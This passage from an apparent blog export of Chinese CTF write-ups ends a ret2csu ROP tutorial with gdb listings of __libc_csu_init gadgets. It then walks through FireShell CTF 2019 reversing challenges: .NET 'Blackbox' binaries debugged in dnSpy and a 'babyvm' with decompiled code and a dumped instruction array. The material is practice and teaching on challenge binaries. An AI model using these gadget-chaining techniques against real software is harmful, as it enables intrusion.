&lt;__libc_csu_init+93&gt;: pop rsp 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: retassassinq&gt;&gt; x/5i 0x000000000040061E 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x000000000040061F 0x40061f &lt;__libc_csu_init+95&gt;: pop rbp 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400621 0x400621 &lt;__libc_csu_init+97&gt;: pop rsi 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400622 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz retassassinq&gt;&gt; x/5i 0x0000000000400623 0x400623 &lt;__libc_csu_init+99&gt;: pop rdi 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz retassassinq&gt;&gt; quit 参考网站https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csuhttps://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.htmlhttps://www.jianshu.com/p/73fff078c19chttps://www.jianshu.com/p/a32dc72bb20f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"2019-FireShell-CTF","slug":"2019-FireShell-CTF","date":"2019-01-30T04:51:13.000Z","updated":"2019-08-26T01:16:38.971Z","comments":true,"path":"2019/01/30/2019-FireShell-CTF/","link":"","permalink":"blog.b3ale.cn/2019/01/30/2019-FireShell-CTF/","excerpt":"比赛没打，当作练习以及看着大佬的 writeup 复现了一下几道二进制。","text":"比赛没打，当作练习以及看着大佬的 writeup 复现了一下几道二进制。 REBlackbox-0先 file 一下： 12$ file Blackbox-0.exeBlackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows 运行程序： 1234This binary is a black box.This means that it was designed to be analyzed without looking it&apos;s inside contentsYou will solve the chalenge by letting the flag to be outputted in some way.You will need to figure out what this binary is doing by just examining it&apos;s behaviour in the environment. 是.NET程序，故使用dnSpy来调试。在单步时，发现\\u000F\\u2009第 354 行返回一个变量text。 在这里设下断点，并多次继续后会得到一串 base64，解密得到 flag： Blackbox-1file 一下： 12$ file Blackbox-1.exeBlackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows 运行程序没有任何输出。同样因为是.NET程序，使用 dnSpy 调试。在\\u000F\\u2009第 358 行返回一个变量text： 在此处设置断点并多次继续，text的值会变成 flag： babyvm一道简单虚拟机。运行一下出现Program executed successfully!。先拖进 ida 查看 main 函数： 12345678910__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; while ( (_BYTE)end_sign ) &#123; get_option(); vm_start(); ++j; &#125; return 0LL;&#125; 第一个函数获取一个 option，然后进入vm_start()执行指令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int vm_start()&#123; void *__ptr32 *v0; // rax int v1; // eax int v2; // ST34_4 int v3; // eax int v4; // ST3C_4 int v5; // eax int v6; // ST28_4 int v7; // eax int v8; // ST30_4 int v9; // eax int v10; // ST1C_4 int v11; // eax int v12; // ST24_4 int v13; // eax int v14; // ST10_4 int v15; // eax int v16; // ST18_4 __int64 savedregs; // [rsp+40h] [rbp+0h] v0 = off_33D0; switch ( (unsigned int)&amp;savedregs ) &#123; case 0u: ++i; ++j; v0 = (void *__ptr32 *)buf; buf[i] = code[j]; break; case 1u: v1 = i--; v2 = buf[v1]; v3 = i--; v4 = buf[v3] + v2; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v4; break; case 3u: LOBYTE(end_sign) = 0; LODWORD(v0) = puts(\"Program executed successfully!\"); break; case 4u: v5 = i--; v6 = buf[v5]; v7 = i--; v8 = v6 * buf[v7]; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v8; break; case 5u: v9 = i--; v10 = buf[v9]; v11 = i--; v12 = buf[v11] / v10; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v12; break; case 6u: v13 = i--; v14 = buf[v13]; v15 = i--; v16 = buf[v15] - v14; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v16; break; default: return (signed int)v0; &#125; return (signed int)v0;&#125; 可以发现程序执行了内部的指令，没有任何与指令有关的输出。只管把指令 dump 出来，再把 switch 写出来复现一下： 12345678910111213141516171819202122232425262728293031323334353637383940code = [0x00000000, 0x00000046, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000343, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000016D5, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000016D5, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000048, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000059, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000024, 0x00000001, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CD5B, 0x00000006, 0x00000002, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CDA1, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000043, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000000F5, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00000149, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000066D, 0x00000000, 0x0000003E, 0x00000001, 0x00000000, 0x000006AB, 0x00000000, 0x0000005A, 0x00000001, 0x00000000, 0x00000705, 0x00000000, 0x00000026, 0x00000006, 0x00000000, 0x00000705, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000E0A, 0x00000000, 0x00000009, 0x00000006, 0x00000000, 0x00000E0A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00008C64, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00034A58, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00170868, 0x00000000, 0x00000032, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000002, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000010, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00170845, 0x00000006, 0x00000002, 0x00000000, 0x00170868, 0x00000000, 0x00170868, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x0000003F, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000006, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000005C4, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x000005ED, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000004D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000000C, 0x00000001, 0x00000000, 0x000005F9, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002FC8, 0x00000000, 0x00000050, 0x00000001, 0x00000000, 0x00003018, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C060, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x0000C085, 0x00000000, 0x00000023, 0x00000006, 0x00000000, 0x0000C085, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0001810A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x000F0A64, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x001E14C8, 0x00000000, 0x0000001C, 0x00000001, 0x00000000, 0x001E14E4, 0x00000000, 0x001E1469, 0x00000006, 0x00000002, 0x00000000, 0x001E14E4, 0x00000000, 0x001E14E4, 0x00000006, 0x00000000, 0x00000043, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000014F, 0x00000000, 0x00000018, 0x00000006, 0x00000000, 0x0000014F, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000007DA, 0x00000000, 0x00000051, 0x00000001, 0x00000000, 0x0000082B, 0x00000000, 0x0000004F, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00004158, 0x00000000, 0x00000019, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00004159, 0x00000000, 0x0000004D, 0x00000001, 0x00000000, 0x000041A6, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000189E4, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC4F9, 0x00000006, 0x00000002, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC53C, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000249, 0x00000000, 0x00000047, 0x00000001, 0x00000000, 0x00000290, 0x00000000, 0x00000012, 0x00000001, 0x00000000, 0x000002A2, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x000002A2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000017B2, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x000017B2, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00001813, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00003026, 0x00000000, 0x0000000A, 0x00000006, 0x00000000, 0x00003026, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C098, 0x00000000, 0x00000045, 0x00000006, 0x00000000, 0x0000C098, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x0000C0EA, 0x00000000, 0x00000037, 0x00000001, 0x00000000, 0x0000C121, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00030484, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00121B18, 0x00000000, 0x00121AA3, 0x00000006, 0x00000002, 0x00000000, 0x00121B18, 0x00000000, 0x00121B18, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000011, 0x00000001, 0x00000000, 0x00000046, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000008C, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000003D4, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000016F8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x000016F8, 0x00000000, 0x00000003, 0x00000001, 0x00000000, 0x000016FB, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00002DF6, 0x00000000, 0x00000060, 0x00000001, 0x00000000, 0x00002E56, 0x00000000, 0x0000005F, 0x00000001, 0x00000000, 0x00002EB5, 0x00000000, 0x00000013, 0x00000001, 0x00000000, 0x00002EC8, 0x00000000, 0x0000002F, 0x00000001, 0x00000000, 0x00002EF7, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0001A6AF, 0x00000000, 0x00000018, 0x00000001, 0x00000000, 0x0001A6C7, 0x00000000, 0x00000039, 0x00000001, 0x00000000, 0x0001A700, 0x00000000, 0x00000043, 0x00000001, 0x00000000, 0x0001A743, 0x00000000, 0x0001A70E, 0x00000006, 0x00000002, 0x00000000, 0x0001A743, 0x00000000, 0x0001A743, 0x00000006, 0x00000000, 0x00000074, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00000099, 0x00000000, 0x00000053, 0x00000006, 0x00000000, 0x00000099, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000561, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x000005C4, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002E20, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00002E45, 0x00000000, 0x00000008, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00002E99, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000E8FD, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x0000E939, 0x00000000, 0x00000040, 0x00000006, 0x00000000, 0x0000E939, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00048E1D, 0x00000000, 0x0000001F, 0x00000001, 0x00000000, 0x00048E3C, 0x00000000, 0x00000036, 0x00000001, 0x00000000, 0x00048E72, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00091CE4, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x001239C8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x001239C8, 0x00000000, 0x00123954, 0x00000006, 0x00000002, 0x00000000, 0x001239C8, 0x00000000, 0x001239C8, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000040, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x00000064, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000320, 0x00000000, 0x00000047, 0x00000006, 0x00000000, 0x00000320, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x00000324, 0x00000000, 0x00000014, 0x00000001, 0x00000000, 0x00000338, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x00000338, 0x00000000, 0x00000044, 0x00000001, 0x00000000, 0x0000037C, 0x00000000, 0x0000005E, 0x00000001, 0x00000000, 0x000003DA, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00002684, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00009A10, 0x00000000, 0x0000000A, 0x00000001, 0x00000000, 0x00009A1A, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x00009A37, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00009A3F, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0004D1F8, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0009A3F0, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x0009A400, 0x00000000, 0x0000003B, 0x00000006, 0x00000000, 0x0009A400, 0x00000000, 0x0009A3D0, 0x00000006, 0x00000002, 0x00000000, 0x0009A400, 0x00000000, 0x0009A400, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x0000007D, 0x00000000, 0x0000000F, 0x00000001, 0x00000000, 0x0000008C, 0x00000000, 0x00000001, 0x00000006, 0x00000000, 0x0000008C, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x000000C8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x000000C8, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00000129, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000A71, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000029C4, 0x00000000, 0x00000047, 0x00000006, 0x00000000, 0x000029C4, 0x00000000, 0x0000001E, 0x00000001, 0x00000000, 0x000029E2, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00007DA6, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00007DA6, 0x00000000, 0x00000058, 0x00000001, 0x00000000, 0x00007DFE, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000371F2, 0x00000000, 0x00000007, 0x00000001, 0x00000000, 0x000371F9, 0x00000000, 0x0000001B, 0x00000006, 0x00000000, 0x000371F9, 0x00000000, 0x00000017, 0x00000001, 0x00000000, 0x00037210, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00037211, 0x00000000, 0x000371A4, 0x00000006, 0x00000002, 0x00000000, 0x00037211, 0x00000000, 0x00037211, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000005F, 0x00000000, 0x0000003F, 0x00000001, 0x00000000, 0x0000009E, 0x00000000, 0x00000052, 0x00000006, 0x00000000, 0x0000009E, 0x00000000, 0x0000004A, 0x00000006, 0x00000000, 0x0000009E, 0x00000000, 0x0000002B, 0x00000001, 0x00000000, 0x000000C9, 0x00000000, 0x0000001F, 0x00000001, 0x00000000, 0x000000E8, 0x00000000, 0x0000004D, 0x00000006, 0x00000000, 0x000000E8, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x000000E8, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00000658, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00000658, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00003918, 0x00000000, 0x00000048, 0x00000006, 0x00000000, 0x00003918, 0x00000000, 0x00000043, 0x00000001, 0x00000000, 0x0000395B, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000AC11, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000AC11, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0002B044, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0002B044, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0012D1DC, 0x00000000, 0x0012D17D, 0x00000006, 0x00000002, 0x00000000, 0x0012D1DC, 0x00000000, 0x0012D1DC, 0x00000006, 0x00000000, 0x00000076, 0x00000000, 0x00000031, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000058, 0x00000001, 0x00000000, 0x000000FF, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000003FC, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000013EC, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x000013F2, 0x00000000, 0x0000001D, 0x00000006, 0x00000000, 0x000013F2, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x000013F2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0000B382, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0004E88E, 0x00000000, 0x00000056, 0x00000006, 0x00000000, 0x0004E88E, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x0004E8C2, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00225D4E, 0x00000000, 0x00225CD8, 0x00000006, 0x00000002, 0x00000000, 0x00225D4E, 0x00000000, 0x00225D4E, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x0000000D, 0x00000001, 0x00000000, 0x0000007A, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00000356, 0x00000000, 0x00000019, 0x00000006, 0x00000000, 0x00000356, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x00000356, 0x00000000, 0x00000018, 0x00000001, 0x00000000, 0x0000036E, 0x00000000, 0x00000040, 0x00000001, 0x00000000, 0x000003AE, 0x00000000, 0x0000000A, 0x00000001, 0x00000000, 0x000003B8, 0x00000000, 0x00000022, 0x00000006, 0x00000000, 0x000003B8, 0x00000000, 0x0000005A, 0x00000006, 0x00000000, 0x000003B8, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x0000041B, 0x00000000, 0x000003AE, 0x00000006, 0x00000002, 0x00000000, 0x0000041B, 0x00000000, 0x0000041B, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00000096, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000384, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00001518, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x00001528, 0x00000000, 0x00000027, 0x00000006, 0x00000000, 0x00001528, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0000A940, 0x00000000, 0x0000005D, 0x00000001, 0x00000000, 0x0000A99D, 0x00000000, 0x0000000B, 0x00000001, 0x00000000, 0x0000A9A8, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0006A090, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0013E1B0, 0x00000000, 0x0000000E, 0x00000001, 0x00000000, 0x0013E1BE, 0x00000000, 0x0013E189, 0x00000006, 0x00000002, 0x00000000, 0x0013E1BE, 0x00000000, 0x0013E1BE, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000048, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000003, 0x00000006, 0x00000000, 0x000000A7, 0x00000000, 0x00000039, 0x00000001, 0x00000000, 0x000000E0, 0x00000000, 0x00000017, 0x00000001, 0x00000000, 0x000000F7, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x000000F7, 0x00000000, 0x0000004E, 0x00000001, 0x00000000, 0x00000145, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x00000181, 0x00000000, 0x00000008, 0x00000006, 0x00000000, 0x00000181, 0x00000000, 0x00000027, 0x00000001, 0x00000000, 0x000001A8, 0x00000000, 0x00000035, 0x00000001, 0x00000000, 0x000001DD, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x000001E1, 0x00000000, 0x0000003A, 0x00000006, 0x00000000, 0x000001E1, 0x00000000, 0x00000057, 0x00000001, 0x00000000, 0x00000238, 0x00000000, 0x0000005A, 0x00000001, 0x00000000, 0x00000292, 0x00000000, 0x0000000A, 0x00000006, 0x00000000, 0x00000292, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x000007B6, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00004D1C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00004D1C, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00009A38, 0x00000000, 0x000099D9, 0x00000006, 0x00000002, 0x00000000, 0x00009A38, 0x00000000, 0x00009A38, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x0000003D, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000014, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000123, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000A3B, 0x00000000, 0x0000005A, 0x00000006, 0x00000000, 0x00000A3B, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00003327, 0x00000000, 0x00000012, 0x00000001, 0x00000000, 0x00003339, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0002003A, 0x00000000, 0x0000003F, 0x00000001, 0x00000000, 0x00020079, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00120441, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x006C1986, 0x00000000, 0x00000033, 0x00000001, 0x00000000, 0x006C19B9, 0x00000000, 0x006C1958, 0x00000006, 0x00000002, 0x00000000, 0x006C19B9, 0x00000000, 0x006C19B9, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0000031E, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00001F2C, 0x00000000, 0x00000027, 0x00000006, 0x00000000, 0x00001F2C, 0x00000000, 0x0000003C, 0x00000006, 0x00000000, 0x00001F2C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00001F2C, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00005D84, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0001D394, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x0001D394, 0x00000000, 0x00000021, 0x00000001, 0x00000000, 0x0001D3B5, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x0001D3B5, 0x00000000, 0x0000005C, 0x00000001, 0x00000000, 0x0001D411, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00075044, 0x00000000, 0x00000011, 0x00000001, 0x00000000, 0x00075055, 0x00000000, 0x0000003A, 0x00000001, 0x00000000, 0x0007508F, 0x00000000, 0x00000060, 0x00000001, 0x00000000, 0x000750EF, 0x00000000, 0x0007507D, 0x00000006, 0x00000002, 0x00000000, 0x000750EF, 0x00000000, 0x000750EF, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x0000000F, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x00000032, 0x00000001, 0x00000000, 0x00000065, 0x00000000, 0x00000023, 0x00000001, 0x00000000, 0x00000088, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000110, 0x00000000, 0x0000005B, 0x00000006, 0x00000000, 0x00000110, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000111, 0x00000000, 0x0000004A, 0x00000006, 0x00000000, 0x00000111, 0x00000000, 0x00000034, 0x00000006, 0x00000000, 0x00000111, 0x00000000, 0x00000020, 0x00000001, 0x00000000, 0x00000131, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00000185, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x00000185, 0x00000000, 0x00000152, 0x00000006, 0x00000002, 0x00000000, 0x00000185, 0x00000000, 0x00000185, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x000000B3, 0x00000000, 0x0000004D, 0x00000001, 0x00000000, 0x00000100, 0x00000000, 0x00000059, 0x00000001, 0x00000000, 0x00000159, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x0000015D, 0x00000000, 0x00000022, 0x00000006, 0x00000000, 0x0000015D, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000574, 0x00000000, 0x00000014, 0x00000006, 0x00000000, 0x00000574, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x00000574, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000105C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000105C, 0x00000000, 0x00000FFD, 0x00000006, 0x00000002, 0x00000000, 0x0000105C, 0x00000000, 0x0000105C, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x0000001C, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000072, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x000000BC, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000000BC, 0x00000000, 0x00000049, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x0000002E, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000003AC, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x000003AC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000003AC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000003AC, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00001D60, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00005820, 0x00000000, 0x0000001F, 